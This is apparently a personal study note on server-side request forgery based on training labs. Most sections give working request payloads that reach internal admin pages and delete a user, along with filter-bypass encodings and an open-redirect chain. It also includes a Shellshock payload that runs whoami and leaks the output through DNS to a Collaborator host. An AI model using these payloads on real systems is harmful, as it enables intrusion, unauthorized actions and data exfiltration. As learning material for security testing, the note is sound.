#SSRF #Completed

![[SSRF.jpg]]
# Server-Side Request Forgery (SSRF)

An attacker can cause a server to make a connection to internal-only services within an organization or force the server to connect to external systems.

For SSRF attacks against a server, attackers cause it to make HTTP requests back to the server hosting the app, via loopback address typically via supplying a URL with a hostname like `127.0.0.1` or `localhost`. 
# SSRF Attacks Against Server

An app may show if an item is in stock via a query to a backend REST API by passing the URL via front-end HTTP request:

```json
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

Request can be modified to specify a URL local to the server:

```json
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

For example, there may be functions to delete users located at `/admin/delete?username=carlos` which could be called and executed via SSRF:

```json
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin/delete?username=carlos
```
# SSRF Against Back End Systems

Sometimes, the app server can interact with back-end systems which often have private IP addresses and protected by network topology. Internal backend systems may contain sensitive functionality without needing authentication.

For example, there may be an administrative interface on an IP such as `https://192.168.0.68/admin`. If so, a request such as the following can be sent:

```json
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```

If the IP address is not known, use Burp Intruder to attempt to guess the internal IP address by adding an insertion point as the last octet (`192.168.0.x`) and a payload list of 1-255:

```json
stockApi=http://192.168.0.§1§:8080/admin&storeId=1
```

>[!info]
>The same can be done for the ports and the directories via fuzzing.
# SSRF Blacklist-Based Input Filters

Some apps block input with values such as `127.0.0.1` or `localhost` or sensitive URLS such as `admin`. Some bypasses may include:

- Alternative IP representation such as `2130706433`, `01770000001` or `127.1`
- Using a domain that resolves to `127.0.0.1` such as `spoofed.burpcollaborator.net`
- Obfuscating blocked strings using URL encoding or case variation
- Using URLs you control which redirect to target URL using different redirect codes, and different protocols (e.g. from `http` to `https:`).

For example, try seeing if the IP can be bypassed first such as:

```json
stockApi=http://127.1&storeId=1
```

If so, try adding sensitive URLs such as `/admin` and see if filters are in place. If so, try various methods such as case variation:

```json
stockApi=http://127.1/aDmIn&storeId=1
```

Or URL encoding or double URL encoding:

```json
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65&storeId=1
```
# SSRF Whitelist-Based Input Filters

Some apps may use whitelists which look for a match at the beginning of the input, or contained inside it which can be bypassed by exploiting inconsistencies in URL parsing. URL specification has features that are likely overlooked when URLs implement ad-hoc parsing and validation such as:

- Embedding credentials in a URL before hostname using `@` - `https://expected-host:fakepassword@evil-host`
- Using `#` to indicate a URL fragment - `https://evil-host#expected-host`
- Leveraging DNS naming hierarchy to place required input into a FQDN you control - `https://expected-host.evil-host`
- URL encoding characters to confuse URL-parsing code. Good if it encodes characters differently than the code that performs back end HTTP requests. Attempt double URL encoding as well.
# SSRF via Open Redirection

Filters can be bypassed via an open redirection vulnerability. For example, imagine the user-submitted URL is validated, but the application whose URLs are allowed contains an open redirection vulnerability.

If the API used to make back end requests supports redirections, a URL can be used to satisfy the filter and redirect a request to the desired back end system such as:

```json
/product/nextProduct?currentProductId=6&path=http://evil-user.net
```

Try leveraging the open redirection to bypass the URL filter via a request such as:

```json
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

The app may first validate the URL is allowed, requests the supplied URL and triggers open redirection. For example, a "Next Product" option may include a path parameter. If so, the payload can be used as follows:

```json
/product/nextProduct?path=http://192.168.0.12:8080/admin
```
# Blind Server-Side Request Forgery

In blind SSRF, the response is not returned in the app's front-end response. To find them, try using out-of-band (OAST) techniques by attempting to trigger an HTTP request to an external system and monitoring for network interactions.

Try using Collaborator to generate unique domain names, send them in payloads and monitor for any interactions. If an HTTP request is received, it is vulnerable.

>[!info]
>It's common to observe a DNS look up, but no HTTP request as the app attempted to make an HTTP request, causing a DNS request but HTTP requests were blocked. 

Try testing every parameter that potentially talks to the back end via a URL. Try submitting a Collaborator 
payload in various areas, such as the `Referer` header. If a request is received, it may be vulnerable.

To exploit blind SSRF, combine it with other attacks such as Shellshock. For example, the `Referer` header may be vulnerable to SSRF and send the User-Agent string with the HTTP request. If so, use the following payload as the User Agent:

```json
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```

Change the `Referer` header to `http://192.168.0.1:8080` and fuzz the IP address using Burp Intruder. If vulnerable, a DNS request will be present in Collaborator containing the result of the `whoami` command.
# Hidden Attack Surface for SSRF

SSRF can be easy to find as the normal traffic involves request parameters containing full URLs. Some other examples are harder.

Sometimes, apps place only a hostname or part of a URL path into request parameters. The value submitted is incorporated server-side into a full URL. If the value is readily recognized as a hostname or URL path, the attack may be obvious. Exploitability as full SSRF might be limited as you can't control the entire URL.

Some apps transmit data in formats with a specification allowing the inclusion of URLS that might get requested by the data parser such as the XML data format. When an app accepts data in XML format and parses it, it may be vulnerable to XXE injection or vulnerable to SSRF via XXE.

Some apps use server-side analytics software to track visitors which often logs Referer headers in requests. The Referer header can be a useful attack surface for SSRF.

